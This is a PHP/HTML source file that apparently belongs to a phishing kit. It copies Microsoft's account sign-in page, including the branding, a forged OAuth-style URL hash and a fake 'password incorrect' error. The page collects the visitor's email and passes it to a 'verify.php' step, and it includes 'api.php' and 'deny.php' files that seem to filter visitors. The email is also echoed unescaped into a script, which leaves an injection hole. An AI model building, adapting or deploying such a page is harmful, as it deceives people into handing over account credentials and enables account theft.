<?php 
include 'api.php';
include 'deny.php';
 ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Sign in to your Microsoft account</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="images/favicon.ico">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
    <script type="text/javascript">
        location.hash = 'response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&state=rQIIAYWSvW7TUACF46RN00pAQRVCRUIVYkAUJ_f6L04khrROUie1myZOUnuxHMdxHduxa187iV8Axg7A0IGhYzcYEGJAzJ069wEQQkICJkbavgDLkY7Ot51vZYnJs3mQB88yMA_LTyiSorXioISXNIbEqRIEuEYRDE7SJEMSAA5pQAb3VlZr60I29frL7tnP9d-bxuzbCbasOlZs5HXPPcMeHSLkh-VCYTqd5r3RyNJvhoKjTYbWxPyEYRcY9h3DTtKLxgTvds7SIUMWaVikiSIEJYoiWZrOi5IMZEmfCn0BCW57LHcAkMc1a7fPJ2JdRkJizpR-wxalhitLPBAlm1akQ1vkukioi65yw3eTK54W61UkcluOmFSAIvXGsrsPLtN39ioROiSuwwusxPiTXh55gav6XohOMm_TIRvbKseTA0sYh8KOP-KqxYYS2xotBaBNDNWmGaB9wifqgY8cUrWcIuPKU7jHWolCSNuMN04EbjZz21BK6CZhzmz2kA8AmId9sGcJntOYHbhHaolHxGDawqO2KXpoay7hjKP3NFLD3YFKxNVYiOt9iOIaqEKK5ZtbWl-sW0MvPKCspLlrmTb0TaTp21agA6eZDBQqUlneNMLhZBtE9QhGYsSVoobTnh8lM1Xv9Bq1bm8kE1Ut5lo9mu4q7Z4zoMfdkU3OS2jUH0-3uLkmy_oAAlUWjKTl86zWkNBs_0Mme3Wm603OM7c935hYww0_8EaWY1wsYD8W7ueyq7kHqY3U0zWQKedyK6up6_Z3ATtdvDKn8_jj6fvoIffuzctGt_U8db5Y6Is7zCZvtI6UWAY6AKjSq24XvLBWkNo6nXCRrY_ZTcHcB90XVBkeZ7HjbPY8e5fnVLEqdaSKyFXaHKGCX1ns1VLq8_J__LtcWSMAAXFA4rC0AYkyhGUaKl9vpf4B0&estsfed=1&uaid=064d1a4694004cbeaaed1af12b6578e6&fci=4345a7b9-9a63-4910-a426-35363201d503&mkt=en-US'
    </script>
</head>
<body>
  
<div class="container-fluid">
    <div class="row d-flex align-items-center">
        <div class="col-lg-4 col-md-5 col-xs-12 mx-auto">
            <div class="card">
                <div class="card-body">
                    <img src="images/logo.svg">
                    <h4 style="animation: slide 0.5s;">Sign In</h4>
                    <span id="error">Your account or password is incorrect. If you don't remember your password, <a href="#">reset it now.</a></span>
                    <form method="POST" class="slideform">
                        <div class="form-group">
                            <input type="email" class="form-control" name="email" placeholder="Email,phone,or Skype" required>
                        </div>
                        <p  style="font-size: 13px">No account? <a href="#" style="font-size: 13px">Create one!</a></p>
                        <br><br>
                        <button type="submit" name="next" class="btn float-right" id="next">Next</button>
                    </form>
                </div>
            </div>
            <div class="card2">
                <div>
                    <img class="tile-img medium" role="presentation" src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" height="30" width="30">
                     <span style="margin-left: 8px;">Sign-in options</span>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="footer">
    <p><img src="images/ellipsis_white.svg"></p>
    <p>Privacy & cookies</p>
    <p>Terms of use</p>
</div>
</body>
</html>
<?php 
if (isset($_POST['next'])) {
    echo "<script>window.location='verify.php?email=".$_POST['email']."'</script>";
}
 ?>